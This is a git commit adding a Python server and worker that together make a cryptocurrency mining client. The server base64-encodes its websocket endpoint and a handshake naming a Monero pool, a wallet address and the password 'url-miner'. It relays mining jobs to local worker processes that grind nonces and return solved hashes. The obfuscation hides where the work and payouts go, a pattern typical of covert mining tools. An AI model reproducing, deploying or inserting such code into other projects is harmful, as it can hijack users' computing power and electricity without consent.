4c7380e0995627e0412eb4f879e576b1651c1470
raiyan088 <78313577+raiyan088@users.noreply.github.com>
2024-02-10 20:08:04 +0600

    Add files via upload

--- python/server.py
+++ python/server.py
@@ -1,1 +1,124 @@
+import os
+import sys
+import json
+import time
+import base64
+import socket
+import threading
+import multiprocessing
+from websocket import create_connection
 
+
+mWorkerNumber = 1
+mClients = []
+mServer = None
+mJob = None
+mSolved = 0
+
+if mWorkerNumber < 1:
+    mWorkerNumber = 1
+
+mSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def handle_client(client):
+    try:
+        while True:
+            try:
+                global mServer
+                global mSolved
+                data = client.makefile().readline()
+                print(data)
+                mSolved += 1
+                if mServer != None:
+                    mServer.send(data)
+
+            except:
+                continue
+    except:
+        sys.exit(0)
+
+
+def sendData(msg):
+    global mJob
+    mJob = msg
+
+    print('Job Received...')
+
+    for i,client in enumerate(mClients):
+        try:
+            client.sendall(msg.encode('utf-8'))
+        except:
+            del mClients[i]
+            continue
+
+
+def handle_wss_server(client):
+    try:
+        while True:
+            line = client.recv()
+            try:
+                data = json.loads(line)
+                if data['identifier'] == 'job':
+                    sendData(line)
+            except:
+                continue
+            
+    except:
+        print('Server Connection Failed')
+        time.sleep(2)
+        connectServer()
+
+def connectServer():
+    try:
+        global mServer
+        print('Server Connecting...')
+        mServer = create_connection(base64.b64decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==').decode('utf-8'))
+        mServer.send(base64.b64decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI4NEFiUG0ybUNpQkNoMTgyZ3N2cVNSWExwRWM5SmdVSjk2eDNLUTZoMzVFQ0V0U3pNV0ZEYW1NZFdMOThwVzE2dGY2MXZKaXczNG5ZZk1paThoVFczcGJUREM3QnFURyIsInBhc3N3b3JkIjoidXJsLW1pbmVyIiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ==').decode('utf-8'))
+        print('Server Connected')
+        threading.Thread(target=handle_wss_server, args=(mServer,)).start()
+    except:
+        print('Server Connection Failed')
+        mServer = None
+        time.sleep(2)
+        connectServer()
+
+def update():
+    global mSolved
+    prev = 0
+
+    while True:
+        if prev != mSolved:
+            print('Hash Solved: {}'.format(mSolved))
+            prev = mSolved
+        time.sleep(5)
+
+def worker(worker):
+    os.system(f'python {worker}')
+
+
+def startWorker():
+    for i in range(mWorkerNumber):
+        proc = multiprocessing.Process(target=worker, args=('worker.py',))
+        proc.start()
+
+
+if __name__ == '__main__':
+
+    connectServer()
+
+    threading.Thread(target=update).start()
+
+    try:
+        mSocket.bind((socket.gethostname(), 9099))
+        mSocket.listen(9099)
+
+        startWorker()
+
+        while True:
+            mClient, mAdress = mSocket.accept()
+            mClients.append(mClient)
+            if mJob != None:
+                mClient.sendall(mJob.encode('utf-8'))
+            threading.Thread(target=handle_client, args=(mClient,)).start()
+    except:
+        sys.exit(0)
---
+++ python/worker.py
@@ -0,0 +1,103 @@
+import sys
+import time
+import json
+import random
+import socket
+import asyncio
+import threading
+from javascript import require
+
+Module = require('./module.js')
+
+time.sleep(2)
+
+mClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+mJob = None
+
+def handle_client(client):
+    try:
+        while True:
+            line = client.makefile().readline()
+            try:
+                global mJob
+                mJob = json.loads(line)
+            except:
+                continue
+    except:
+        sys.exit(0)
+
+
+def hex2Int(data):
+    res = []
+    for idx in range(0, len(data), 2):
+        res.append(data[idx : idx + 2])
+
+    return int(''.join(res[::-1]), 16)
+
+def int2hex(hex):
+    data = format(hex, '02x').zfill(8)
+
+    res = []
+    for idx in range(0, len(data), 2):
+        res.append(data[idx : idx + 2])
+
+    return ''.join(res[::-1])
+
+
+def targetHash(job):
+    output = {
+        'solved': False,
+        'hash': None,
+        'nonce': None
+    }
+    try:
+        target = hex2Int(job['target'])
+        hexnonce = int2hex(random.randint(0, 4294967295))
+        blob = job['blob'][0:78]+hexnonce+job['blob'][86:len(job['blob'])]
+        if job['algo'] == 'ghostrider':
+            blob = job['blob'][0:152]+hexnonce
+        seed_hash = None
+        try:
+            seed_hash = job['seed_hash']
+        except:
+            seed_hash = None
+        hash = Module.hash(blob, job['algo'], job['targets'], job['variant'], job['height'], seed_hash)
+        
+        if hash != None:
+            if hex2Int(hash[56:64]) < target:
+                output['job_id'] = job['job_id']
+                output['hash'] = hash
+                output['nonce'] = hexnonce
+                output['solved'] = True
+    except:
+        output['solved'] = False
+
+    return output
+
+
+if __name__ == "__main__":
+
+    try:
+        mClient.connect((socket.gethostname(), 9099))
+
+        threading.Thread(target=handle_client, args=(mClient,)).start()
+
+        while True:
+            try:
+                if mJob != None:
+                    data = targetHash(mJob)
+                    if data['solved']:
+                        submit = {
+                            'identifier': 'solved',
+                            'job_id': data['job_id'],
+                            'nonce': data['nonce'],
+                            'result': data['hash']
+                        }
+                        mClient.sendall(str(json.dumps(submit)+'\n').encode('utf-8'))
+                else:
+                    time.sleep(1)
+            except:
+                continue
+    except:
+        sys.exit(0)
